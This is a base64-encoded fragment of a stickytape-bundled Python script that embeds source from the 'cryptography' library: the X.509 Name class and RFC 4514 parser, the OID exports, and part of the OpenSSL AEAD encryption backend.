ZXZlciB1c2VkIGluXHJcbiAgICAgICAgcmVhbCB3b3JsZCBjZXJ0aWZpY2F0ZXMuIEFjY29yZGluZyB0byBSRkM0NTE0IHNlY3Rpb24gMi4xIHRoZVxyXG4gICAgICAgIFJETlNlcXVlbmNlIG11c3QgYmUgcmV2ZXJzZWQgd2hlbiBjb252ZXJ0aW5nIHRvIHN0cmluZyByZXByZXNlbnRhdGlvbi5cclxuICAgICAgICAiIiJcclxuICAgICAgICByZXR1cm4gIiwiLmpvaW4oXHJcbiAgICAgICAgICAgIGF0dHIucmZjNDUxNF9zdHJpbmcoYXR0cl9uYW1lX292ZXJyaWRlcylcclxuICAgICAgICAgICAgZm9yIGF0dHIgaW4gcmV2ZXJzZWQoc2VsZi5fYXR0cmlidXRlcylcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIGdldF9hdHRyaWJ1dGVzX2Zvcl9vaWQoXHJcbiAgICAgICAgc2VsZiwgb2lkOiBPYmplY3RJZGVudGlmaWVyXHJcbiAgICApIC0+IHR5cGluZy5MaXN0W05hbWVBdHRyaWJ1dGVdOlxyXG4gICAgICAgIHJldHVybiBbaSBmb3IgaSBpbiBzZWxmIGlmIGkub2lkID09IG9pZF1cclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiByZG5zKHNlbGYpIC0+IHR5cGluZy5MaXN0W1JlbGF0aXZlRGlzdGluZ3Vpc2hlZE5hbWVdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9hdHRyaWJ1dGVzXHJcblxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhzZWxmLCBiYWNrZW5kOiB0eXBpbmcuQW55ID0gTm9uZSkgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHJ1c3RfeDUwOS5lbmNvZGVfbmFtZV9ieXRlcyhzZWxmKVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgTmFtZSk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5fYXR0cmlidXRlcyA9PSBvdGhlci5fYXR0cmlidXRlc1xyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgIyBUT0RPOiB0aGlzIGlzIHJlbGF0aXZlbHkgZXhwZW5zaXZlLCBpZiB0aGlzIGxvb2tzIGxpa2UgYSBib3R0bGVuZWNrXHJcbiAgICAgICAgIyBmb3IgeW91LCBjb25zaWRlciBvcHRpbWl6aW5nIVxyXG4gICAgICAgIHJldHVybiBoYXNoKHR1cGxlKHNlbGYuX2F0dHJpYnV0ZXMpKVxyXG5cclxuICAgIGRlZiBfX2l0ZXJfXyhzZWxmKSAtPiB0eXBpbmcuSXRlcmF0b3JbTmFtZUF0dHJpYnV0ZV06XHJcbiAgICAgICAgZm9yIHJkbiBpbiBzZWxmLl9hdHRyaWJ1dGVzOlxyXG4gICAgICAgICAgICBmb3IgYXZhIGluIHJkbjpcclxuICAgICAgICAgICAgICAgIHlpZWxkIGF2YVxyXG5cclxuICAgIGRlZiBfX2xlbl9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc3VtKGxlbihyZG4pIGZvciByZG4gaW4gc2VsZi5fYXR0cmlidXRlcylcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJkbnMgPSAiLCIuam9pbihhdHRyLnJmYzQ1MTRfc3RyaW5nKCkgZm9yIGF0dHIgaW4gc2VsZi5fYXR0cmlidXRlcylcclxuICAgICAgICByZXR1cm4gIjxOYW1lKHt9KT4iLmZvcm1hdChyZG5zKVxyXG5cclxuXHJcbmNsYXNzIF9SRkM0NTE0TmFtZVBhcnNlcjpcclxuICAgIF9PSURfUkUgPSByZS5jb21waWxlKHIiKDB8KFsxLTldXFxkKikpKFxcLigwfChbMS05XVxcZCopKSkrIilcclxuICAgIF9ERVNDUl9SRSA9IHJlLmNvbXBpbGUociJbYS16QS1aXVthLXpBLVpcXGQtXSoiKVxyXG5cclxuICAgIF9QQUlSID0gciJcXFxcKFtcXFxcICM9XFwiXFwrLDs8Pl18W1xcZGEtekEtWl17Mn0pIlxyXG4gICAgX1BBSVJfUkUgPSByZS5jb21waWxlKF9QQUlSKVxyXG4gICAgX0xVVEYxID0gciJbXFx4MDEtXFx4MWZcXHgyMVxceDI0LVxceDJBXFx4MkQtXFx4M0FcXHgzRFxceDNGLVxceDVCXFx4NUQtXFx4N0ZdIlxyXG4gICAgX1NVVEYxID0gciJbXFx4MDEtXFx4MjFcXHgyMy1cXHgyQVxceDJELVxceDNBXFx4M0RcXHgzRi1cXHg1QlxceDVELVxceDdGXSJcclxuICAgIF9UVVRGMSA9IHIiW1xceDAxLVxceDFGXFx4MjFcXHgyMy1cXHgyQVxceDJELVxceDNBXFx4M0RcXHgzRi1cXHg1QlxceDVELVxceDdGXSJcclxuICAgIF9VVEZNQiA9IHJmIltcXHg4MC17Y2hyKHN5cy5tYXh1bmljb2RlKX1dIlxyXG4gICAgX0xFQURDSEFSID0gcmYie19MVVRGMX18e19VVEZNQn0iXHJcbiAgICBfU1RSSU5HQ0hBUiA9IHJmIntfU1VURjF9fHtfVVRGTUJ9IlxyXG4gICAgX1RSQUlMQ0hBUiA9IHJmIntfVFVURjF9fHtfVVRGTUJ9IlxyXG4gICAgX1NUUklOR19SRSA9IHJlLmNvbXBpbGUoXHJcbiAgICAgICAgcmYiIiJcclxuICAgICAgICAoXHJcbiAgICAgICAgICAgICh7X0xFQURDSEFSfXx7X1BBSVJ9KVxyXG4gICAgICAgICAgICAoXHJcbiAgICAgICAgICAgICAgICAoe19TVFJJTkdDSEFSfXx7X1BBSVJ9KSpcclxuICAgICAgICAgICAgICAgICh7X1RSQUlMQ0hBUn18e19QQUlSfSlcclxuICAgICAgICAgICAgKT9cclxuICAgICAgICApP1xyXG4gICAgICAgICIiIixcclxuICAgICAgICByZS5WRVJCT1NFLFxyXG4gICAgKVxyXG4gICAgX0hFWFNUUklOR19SRSA9IHJlLmNvbXBpbGUociIjKFtcXGRhLXpBLVpdezJ9KSsiKVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBkYXRhOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fZGF0YSA9IGRhdGFcclxuICAgICAgICBzZWxmLl9pZHggPSAwXHJcblxyXG4gICAgZGVmIF9oYXNfZGF0YShzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9pZHggPCBsZW4oc2VsZi5fZGF0YSlcclxuXHJcbiAgICBkZWYgX3BlZWsoc2VsZikgLT4gdHlwaW5nLk9wdGlvbmFsW3N0cl06XHJcbiAgICAgICAgaWYgc2VsZi5faGFzX2RhdGEoKTpcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2RhdGFbc2VsZi5faWR4XVxyXG4gICAgICAgIHJldHVybiBOb25lXHJcblxyXG4gICAgZGVmIF9yZWFkX2NoYXIoc2VsZiwgY2g6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl9wZWVrKCkgIT0gY2g6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3JcclxuICAgICAgICBzZWxmLl9pZHggKz0gMVxyXG5cclxuICAgIGRlZiBfcmVhZF9yZShzZWxmLCBwYXQpIC0+IHN0cjpcclxuICAgICAgICBtYXRjaCA9IHBhdC5tYXRjaChzZWxmLl9kYXRhLCBwb3M9c2VsZi5faWR4KVxyXG4gICAgICAgIGlmIG1hdGNoIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3JcclxuICAgICAgICB2YWwgPSBtYXRjaC5ncm91cCgpXHJcbiAgICAgICAgc2VsZi5faWR4ICs9IGxlbih2YWwpXHJcbiAgICAgICAgcmV0dXJuIHZhbFxyXG5cclxuICAgIGRlZiBwYXJzZShzZWxmKSAtPiBOYW1lOlxyXG4gICAgICAgIHJkbnMgPSBbc2VsZi5fcGFyc2VfcmRuKCldXHJcblxyXG4gICAgICAgIHdoaWxlIHNlbGYuX2hhc19kYXRhKCk6XHJcbiAgICAgICAgICAgIHNlbGYuX3JlYWRfY2hhcigiLCIpXHJcbiAgICAgICAgICAgIHJkbnMuYXBwZW5kKHNlbGYuX3BhcnNlX3JkbigpKVxyXG5cclxuICAgICAgICByZXR1cm4gTmFtZShyZG5zKVxyXG5cclxuICAgIGRlZiBfcGFyc2VfcmRuKHNlbGYpIC0+IFJlbGF0aXZlRGlzdGluZ3Vpc2hlZE5hbWU6XHJcbiAgICAgICAgbmFzID0gW3NlbGYuX3BhcnNlX25hKCldXHJcbiAgICAgICAgd2hpbGUgc2VsZi5fcGVlaygpID09ICIrIjpcclxuICAgICAgICAgICAgc2VsZi5fcmVhZF9jaGFyKCIrIilcclxuICAgICAgICAgICAgbmFzLmFwcGVuZChzZWxmLl9wYXJzZV9uYSgpKVxyXG5cclxuICAgICAgICByZXR1cm4gUmVsYXRpdmVEaXN0aW5ndWlzaGVkTmFtZShuYXMpXHJcblxyXG4gICAgZGVmIF9wYXJzZV9uYShzZWxmKSAtPiBOYW1lQXR0cmlidXRlOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgb2lkX3ZhbHVlID0gc2VsZi5fcmVhZF9yZShzZWxmLl9PSURfUkUpXHJcbiAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6XHJcbiAgICAgICAgICAgIG5hbWUgPSBzZWxmLl9yZWFkX3JlKHNlbGYuX0RFU0NSX1JFKVxyXG4gICAgICAgICAgICBvaWQgPSBfTkFNRV9UT19OQU1FT0lELmdldChuYW1lKVxyXG4gICAgICAgICAgICBpZiBvaWQgaXMgTm9uZTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3JcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBvaWQgPSBPYmplY3RJZGVudGlmaWVyKG9pZF92YWx1ZSlcclxuXHJcbiAgICAgICAgc2VsZi5fcmVhZF9jaGFyKCI9IilcclxuICAgICAgICBpZiBzZWxmLl9wZWVrKCkgPT0gIiMiOlxyXG4gICAgICAgICAgICB2YWx1ZSA9IHNlbGYuX3JlYWRfcmUoc2VsZi5fSEVYU1RSSU5HX1JFKVxyXG4gICAgICAgICAgICB2YWx1ZSA9IGJpbmFzY2lpLnVuaGV4bGlmeSh2YWx1ZVsxOl0pLmRlY29kZSgpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmF3X3ZhbHVlID0gc2VsZi5fcmVhZF9yZShzZWxmLl9TVFJJTkdfUkUpXHJcbiAgICAgICAgICAgIHZhbHVlID0gX3VuZXNjYXBlX2RuX3ZhbHVlKHJhd192YWx1ZSlcclxuXHJcbiAgICAgICAgcmV0dXJuIE5hbWVBdHRyaWJ1dGUob2lkLCB2YWx1ZSlcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS94NTA5L29pZC5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5fb2lkIGltcG9ydCAoXHJcbiAgICBBdHRyaWJ1dGVPSUQsXHJcbiAgICBBdXRob3JpdHlJbmZvcm1hdGlvbkFjY2Vzc09JRCxcclxuICAgIENSTEVudHJ5RXh0ZW5zaW9uT0lELFxyXG4gICAgQ2VydGlmaWNhdGVQb2xpY2llc09JRCxcclxuICAgIEV4dGVuZGVkS2V5VXNhZ2VPSUQsXHJcbiAgICBFeHRlbnNpb25PSUQsXHJcbiAgICBOYW1lT0lELFxyXG4gICAgT0NTUEV4dGVuc2lvbk9JRCxcclxuICAgIE9iamVjdElkZW50aWZpZXIsXHJcbiAgICBTaWduYXR1cmVBbGdvcml0aG1PSUQsXHJcbiAgICBTdWJqZWN0SW5mb3JtYXRpb25BY2Nlc3NPSUQsXHJcbilcclxuXHJcblxyXG5fX2FsbF9fID0gW1xyXG4gICAgIkF0dHJpYnV0ZU9JRCIsXHJcbiAgICAiQXV0aG9yaXR5SW5mb3JtYXRpb25BY2Nlc3NPSUQiLFxyXG4gICAgIkNSTEVudHJ5RXh0ZW5zaW9uT0lEIixcclxuICAgICJDZXJ0aWZpY2F0ZVBvbGljaWVzT0lEIixcclxuICAgICJFeHRlbmRlZEtleVVzYWdlT0lEIixcclxuICAgICJFeHRlbnNpb25PSUQiLFxyXG4gICAgIk5hbWVPSUQiLFxyXG4gICAgIk9DU1BFeHRlbnNpb25PSUQiLFxyXG4gICAgIk9iamVjdElkZW50aWZpZXIiLFxyXG4gICAgIlNpZ25hdHVyZUFsZ29yaXRobU9JRCIsXHJcbiAgICAiU3ViamVjdEluZm9ybWF0aW9uQWNjZXNzT0lEIixcclxuXVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9iYWNrZW5kcy9vcGVuc3NsL2FlYWQucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5pbXBvcnQgdHlwaW5nXHJcblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5leGNlcHRpb25zIGltcG9ydCBJbnZhbGlkVGFnXHJcblxyXG5cclxuaWYgdHlwaW5nLlRZUEVfQ0hFQ0tJTkc6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBCYWNrZW5kXHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5jaXBoZXJzLmFlYWQgaW1wb3J0IChcclxuICAgICAgICBBRVNDQ00sXHJcbiAgICAgICAgQUVTR0NNLFxyXG4gICAgICAgIEFFU09DQjMsXHJcbiAgICAgICAgQUVTU0lWLFxyXG4gICAgICAgIENoYUNoYTIwUG9seTEzMDUsXHJcbiAgICApXHJcblxyXG4gICAgX0FFQURfVFlQRVMgPSB0eXBpbmcuVW5pb25bXHJcbiAgICAgICAgQUVTQ0NNLCBBRVNHQ00sIEFFU09DQjMsIEFFU1NJViwgQ2hhQ2hhMjBQb2x5MTMwNVxyXG4gICAgXVxyXG5cclxuX0VOQ1JZUFQgPSAxXHJcbl9ERUNSWVBUID0gMFxyXG5cclxuXHJcbmRlZiBfYWVhZF9jaXBoZXJfbmFtZShjaXBoZXI6ICJfQUVBRF9UWVBFUyIpIC0+IGJ5dGVzOlxyXG4gICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycy5hZWFkIGltcG9ydCAoXHJcbiAgICAgICAgQUVTQ0NNLFxyXG4gICAgICAgIEFFU0dDTSxcclxuICAgICAgICBBRVNPQ0IzLFxyXG4gICAgICAgIEFFU1NJVixcclxuICAgICAgICBDaGFDaGEyMFBvbHkxMzA1LFxyXG4gICAgKVxyXG5cclxuICAgIGlmIGlzaW5zdGFuY2UoY2lwaGVyLCBDaGFDaGEyMFBvbHkxMzA1KTpcclxuICAgICAgICByZXR1cm4gYiJjaGFjaGEyMC1wb2x5MTMwNSJcclxuICAgIGVsaWYgaXNpbnN0YW5jZShjaXBoZXIsIEFFU0NDTSk6XHJcbiAgICAgICAgcmV0dXJuIGYiYWVzLXtsZW4oY2lwaGVyLl9rZXkpICogOH0tY2NtIi5lbmNvZGUoImFzY2lpIilcclxuICAgIGVsaWYgaXNpbnN0YW5jZShjaXBoZXIsIEFFU09DQjMpOlxyXG4gICAgICAgIHJldHVybiBmImFlcy17bGVuKGNpcGhlci5fa2V5KSAqIDh9LW9jYiIuZW5jb2RlKCJhc2NpaSIpXHJcbiAgICBlbGlmIGlzaW5zdGFuY2UoY2lwaGVyLCBBRVNTSVYpOlxyXG4gICAgICAgIHJldHVybiBmImFlcy17bGVuKGNpcGhlci5fa2V5KSAqIDggLy8gMn0tc2l2Ii5lbmNvZGUoImFzY2lpIilcclxuICAgIGVsc2U6XHJcbiAgICAgICAgYXNzZXJ0IGlzaW5zdGFuY2UoY2lwaGVyLCBBRVNHQ00pXHJcbiAgICAgICAgcmV0dXJuIGYiYWVzLXtsZW4oY2lwaGVyLl9rZXkpICogOH0tZ2NtIi5lbmNvZGUoImFzY2lpIilcclxuXHJcblxyXG5kZWYgX2V2cF9jaXBoZXIoY2lwaGVyX25hbWU6IGJ5dGVzLCBiYWNrZW5kOiAiQmFja2VuZCIpOlxyXG4gICAgaWYgY2lwaGVyX25hbWUuZW5kc3dpdGgoYiItc2l2Iik6XHJcbiAgICAgICAgZXZwX2NpcGhlciA9IGJhY2tlbmQuX2xpYi5FVlBfQ0lQSEVSX2ZldGNoKFxyXG4gICAgICAgICAgICBiYWNrZW5kLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgY2lwaGVyX25hbWUsXHJcbiAgICAgICAgICAgIGJhY2tlbmQuX2ZmaS5OVUxMLFxyXG4gICAgICAgIClcclxuICAgICAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KGV2cF9jaXBoZXIgIT0gYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgZXZwX2NpcGhlciA9IGJhY2tlbmQuX2ZmaS5nYyhldnBfY2lwaGVyLCBiYWNrZW5kLl9saWIuRVZQX0NJUEhFUl9mcmVlKVxyXG4gICAgZWxzZTpcclxuICAgICAgICBldnBfY2lwaGVyID0gYmFja2VuZC5fbGliLkVWUF9nZXRfY2lwaGVyYnluYW1lKGNpcGhlcl9uYW1lKVxyXG4gICAgICAgIGJhY2tlbmQub3BlbnNzbF9hc3NlcnQoZXZwX2NpcGhlciAhPSBiYWNrZW5kLl9mZmkuTlVMTClcclxuXHJcbiAgICByZXR1cm4gZXZwX2NpcGhlclxyXG5cclxuXHJcbmRlZiBfYWVhZF9zZXR1cChcclxuICAgIGJhY2tlbmQ6ICJCYWNrZW5kIixcclxuICAgIGNpcGhlcl9uYW1lOiBieXRlcyxcclxuICAgIGtleTogYnl0ZXMsXHJcbiAgICBub25jZTogYnl0ZXMsXHJcbiAgICB0YWc6IHR5cGluZy5PcHRpb25hbFtieXRlc10sXHJcbiAgICB0YWdfbGVuOiBpbnQsXHJcbiAgICBvcGVyYXRpb246IGludCxcclxuKTpcclxuICAgIGV2cF9jaXBoZXIgPSBfZXZwX2NpcGhlcihjaXBoZXJfbmFtZSwgYmFja2VuZClcclxuICAgIGN0eCA9IGJhY2tlbmQuX2xpYi5FVlBfQ0lQSEVSX0NUWF9uZXcoKVxyXG4gICAgY3R4ID0gYmFja2VuZC5fZmZpLmdjKGN0eCwgYmFja2VuZC5fbGliLkVWUF9DSVBIRVJfQ1RYX2ZyZWUpXHJcbiAgICByZXMgPSBiYWNrZW5kLl9saWIuRVZQX0NpcGhlckluaXRfZXgoXHJcbiAgICAgICAgY3R4LFxyXG4gICAgICAgIGV2cF9jaXBoZXIsXHJcbiAgICAgICAgYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgaW50KG9wZXJhdGlvbiA9PSBfRU5DUllQVCksXHJcbiAgICApXHJcbiAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyAhPSAwKVxyXG4gICAgcmVzID0gYmFja2VuZC5fbGliLkVWUF9DSVBIRVJfQ1RYX3NldF9rZXlfbGVuZ3RoKGN0eCwgbGVuKGtleSkpXHJcbiAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyAhPSAwKVxyXG4gICAgcmVzID0gYmFja2VuZC5fbGliLkVWUF9DSVBIRVJfQ1RYX2N0cmwoXHJcbiAgICAgICAgY3R4LFxyXG4gICAgICAgIGJhY2tlbmQuX2xpYi5FVlBfQ1RSTF9BRUFEX1NFVF9JVkxFTixcclxuICAgICAgICBsZW4obm9uY2UpLFxyXG4gICAgICAgIGJhY2tlbmQuX2ZmaS5OVUxMLFxyXG4gICAgKVxyXG4gICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgIT0gMClcclxuICAgIGlmIG9wZXJhdGlvbiA9PSBfREVDUllQVDpcclxuICAgICAgICBhc3NlcnQgdGFnIGlzIG5vdCBOb25lXHJcbiAgICAgICAgcmVzID0gYmFja2VuZC5fbGliLkVWUF9DSVBIRVJfQ1RYX2N0cmwoXHJcbiAgICAgICAgICAgIGN0eCwgYmFja2VuZC5fbGliLkVWUF9DVFJMX0FFQURfU0VUX1RBRywgbGVuKHRhZyksIHRhZ1xyXG4gICAgICAgIClcclxuICAgICAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyAhPSAwKVxyXG4gICAgZWxpZiBjaXBoZXJfbmFtZS5lbmRzd2l0aChiIi1jY20iKTpcclxuICAgICAgICByZXMgPSBiYWNrZW5kLl9saWIuRVZQX0NJUEhFUl9DVFhfY3RybChcclxuICAgICAgICAgICAgY3R4LCBiYWNrZW5kLl9saWIuRVZQX0NUUkxfQUVBRF9TRVRfVEFHLCB0YWdfbGVuLCBiYWNrZW5kLl9mZmkuTlVMTFxyXG4gICAgICAgIClcclxuICAgICAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyAhPSAwKVxyXG5cclxuICAgIG5vbmNlX3B0ciA9IGJhY2tlbmQuX2ZmaS5mcm9tX2J1ZmZlcihub25jZSlcclxuICAgIGtleV9wdHIgPSBiYWNrZW5kLl9mZmkuZnJvbV9idWZmZXIoa2V5KVxyXG4gICAgcmVzID0gYmFja2VuZC5fbGliLkVWUF9DaXBoZXJJbml0X2V4KFxyXG4gICAgICAgIGN0eCxcclxuICAgICAgICBiYWNrZW5kLl9mZmkuTlVMTCxcclxuICAgICAgICBiYWNrZW5kLl9mZmkuTlVMTCxcclxuICAgICAgICBrZXlfcHRyLFxyXG4gICAgICAgIG5vbmNlX3B0cixcclxuICAgICAgICBpbnQob3BlcmF0aW9uID09IF9FTkNSWVBUKSxcclxuICAgIClcclxuICAgIGJhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzICE9IDApXHJcbiAgICByZXR1cm4gY3R4XHJcblxyXG5cclxuZGVmIF9zZXRfbGVuZ3RoKGJhY2tlbmQ6ICJCYWNrZW5kIiwgY3R4LCBkYXRhX2xlbjogaW50KSAtPiBOb25lOlxyXG4gICAgaW50cHRyID0gYmFja2VuZC5fZmZpLm5ldygiaW50ICoiKVxyXG4gICAgcmVzID0gYmFja2VuZC5fbGliLkVWUF9DaXBoZXJVcGRhdGUoXHJcbiAgICAgICAgY3R4LCBiYWNrZW5kLl9mZmkuTlVMTCwgaW50cHRyLCBiYWNrZW5kLl9mZmkuTlVMTCwgZGF0YV9sZW5cclxuICAgIClcclxuICAgIGJhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzICE9IDApXHJcblxyXG5cclxuZGVmIF9wcm9jZXNzX2FhZChiYWNrZW5kOiAiQmFja2VuZCIsIGN0eCwgYXNzb2NpYXRlZF9kYXRhOiBieXRlcykgLT4gTm9uZTpcclxuICAgIG91dGxlbiA9IGJhY2tlbmQuX2ZmaS5uZXcoImludCAqIilcclxuICAgIHJlcyA9IGJhY2tlbmQuX2xpYi5FVlBfQ2lwaGVyVXBkYXRlKFxyXG4gICAgICAgIGN0eCwgYmFja2VuZC5fZmZpLk5VTEwsIG91dGxlbiwgYXNzb2NpYXRlZF9kYXRhLCBsZW4oYXNzb2NpYXRlZF9kYXRhKVxyXG4gICAgKVxyXG4gICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgIT0gMClcclxuXHJcblxyXG5kZWYgX3Byb2Nlc3NfZGF0YShiYWNrZW5kOiAiQmFja2VuZCIsIGN0eCwgZGF0YTogYnl0ZXMpIC0+IGJ5dGVzOlxyXG4gICAgb3V0bGVuID0gYmFja2VuZC5fZmZpLm5ldygiaW50ICoiKVxyXG4gICAgYnVmID0gYmFja2VuZC5fZmZpLm5ldygidW5zaWduZWQgY2hhcltdIiwgbGVuKGRhdGEpKVxyXG4gICAgcmVzID0gYmFja2VuZC5fbGliLkVWUF9DaXBoZXJVcGRhdGUoY3R4LCBidWYsIG91dGxlbiwgZGF0YSwgbGVuKGRhdGEpKVxyXG4gICAgaWYgcmVzID09IDA6XHJcbiAgICAgICAgIyBBRVMgU0lWIGNhbiBlcnJvciBoZXJlIGlmIHRoZSBkYXRhIGlzIGludmFsaWQgb24gZGVjcnlwdFxyXG4gICAgICAgIGJhY2tlbmQuX2NvbnN1bWVfZXJyb3JzKClcclxuICAgICAgICByYWlzZSBJbnZhbGlkVGFnXHJcbiAgICByZXR1cm4gYmFja2VuZC5fZmZpLmJ1ZmZlcihidWYsIG91dGxlblswXSlbOl1cclxuXHJcblxyXG5kZWYgX2VuY3J5cHQoXHJcbiAgICBiYWNrZW5kOiAiQmFja2VuZCIsXHJcbiAgICBjaXBoZXI6ICJfQUVBRF9UWVBFUyIsXHJcbiAgICBub25jZTogYnl0ZXMsXHJcbiAgICBkYXRhOiBieXRlcyxcclxuICAgIGFzc29jaWF0ZWRfZGF0YTogdHlwaW5nLkxpc3RbYnl0ZXNdLFxyXG4gICAgdGFnX2xlbmd0aDogaW50LFxyXG4pIC0+IGJ5dGVzOlxyXG4gICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycy5hZWFkIGltcG9ydCBBRVNDQ00sIEFFU1NJVlxyXG5cclxuICAgIGNpcGhlcl9uYW1lID0gX2FlYWRfY2lwaGVyX25hbWUoY2lwaGVyKVxyXG4gICAgY3R4ID0gX2FlYWRfc2V0dXAoXHJcbiAgICAgICAgYmFja2VuZCwgY2lwaGVyX25hbWUsIGNpcGhlci5fa2V5LCBub25jZSwgTm9uZSwgdGFnX2xlbmd0aCwgX0VOQ1JZUFRcclxuICAgIClcclxuICAgICMgQ0NNIHJlcXVpcmVzIHVzIHRvIHBhc3MgdGhlIGxlbmd0aCBvZiB0aGUgZGF0YSBiZWZvcmUgcHJvY2Vzc2luZyBhbnl0aGluZ1xyXG4gICAgIyBIb3dldmVyIGNhbGxpbmcgdGhpcyB3aXRoIGFueSBvdGhlciBBRUFEIHJlc3VsdHMgaW4gYW4gZXJyb3JcclxuICAgIGlmIGlzaW5zdGFuY2UoY2lwaGVyLCBBRVNDQ00pOlxyXG4gICAgICAgIF9zZXRfbGVuZ3RoKGJhY2tlbmQsIGN0eCwgbGVuKGRhdGEpKVxyXG5cclxuICAgIGZvciBhZCBpbiBhc3NvY2lhdGVkX2RhdGE6XHJcbiAgICAgICAgX3Byb2Nlc3NfYWFkKGJhY2tlbmQsIGN0eCwgYWQpXHJcbiAgICBwcm9jZXNzZWRfZGF0YSA9IF9wcm9jZXNzX2RhdGEoYmFja2VuZCwgY3R4LCBkYXRhKVxyXG4gICAgb3V0bGVuID0gYmFja2VuZC5fZmZpLm5ldygiaW50ICoiKVxyXG4gICAgIyBBbGwgQUVBRHMgd2Ugc3VwcG9ydCBiZXNpZGVzIE9DQiBhcmUgc3RyZWFtaW5nIHNvIHRoZXkgcmV0dXJuIG5vdGhpbmdcclxuICAgICMgaW4gZmluYWxpemF0aW9uLiBPQ0IgY2FuIHJldHVybiB1cCB0byAoMTYgYnl0ZSBibG9jayAtIDEpIGJ5dGVzIHNvXHJcbiAgICAjIHdlIG5lZWQgYSBidWZmZXIgaGVyZSB0b28uXHJcbiAgICBidWYgPSBiYWNrZW5kLl9mZmkubmV3KCJ1bnNpZ25lZCBjaGFyW10iLCAxNilcclxuICAgIHJlcyA9IGJhY2tlbmQuX2xpYi5FVlBfQ2lwaGVyRmluYWxfZXgoY3R4LCBidWYsIG91dGxlbilcclxuICAgIGJhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzICE9IDApXHJcbiAgICBwcm9jZXNzZWRfZGF0YSArPSBiYWNrZW5kLl9mZmkuYnVmZmVyKGJ1Ziwgb3V0bGVuWzBdKVs6XVxyXG4gICAgdGFnX2J1ZiA9IGJhY2tlbmQuX2ZmaS5uZXcoInVuc2lnbmVkIGNoYXJbXSIsIHRhZ19sZW5ndGgpXHJcbiAgICByZXMgPSBiYWNrZW5kLl9saWIuRVZQX0NJUEhFUl9DVFhfY3RybChcclxuICAgICAgICBjdHgsIGJhY2tlbmQuX2xpYi5FVlBfQ1RSTF9BRUFEX0dFVF9UQUcsIHRhZ19sZW5ndGgsIHRhZ19idWZcclxuICAgIClc